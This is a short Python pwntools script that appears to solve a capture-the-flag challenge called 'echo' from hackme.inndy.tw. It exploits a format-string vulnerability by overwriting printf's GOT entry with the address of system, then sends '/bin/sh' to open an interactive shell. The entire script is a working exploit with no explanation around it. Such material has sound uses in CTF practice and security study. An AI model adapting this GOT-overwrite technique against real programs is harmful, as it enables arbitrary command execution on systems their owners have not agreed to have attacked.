#!/usr/bin/env python
# encoding: utf-8

from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

# io = remote('hackme.inndy.tw', 7711)
elf = ELF('./echo')
system_plt = elf.plt['system']
printf_got = elf.got['printf']
io = process('./echo')
# gdb.attach(io, 'b * 0x80485b9')
payload = fmtstr_payload(7,{printf_got: system_plt})
print payload
io.sendline(payload)
io.sendline('/bin/sh' + '\x00')
io.interactive()
io.close()

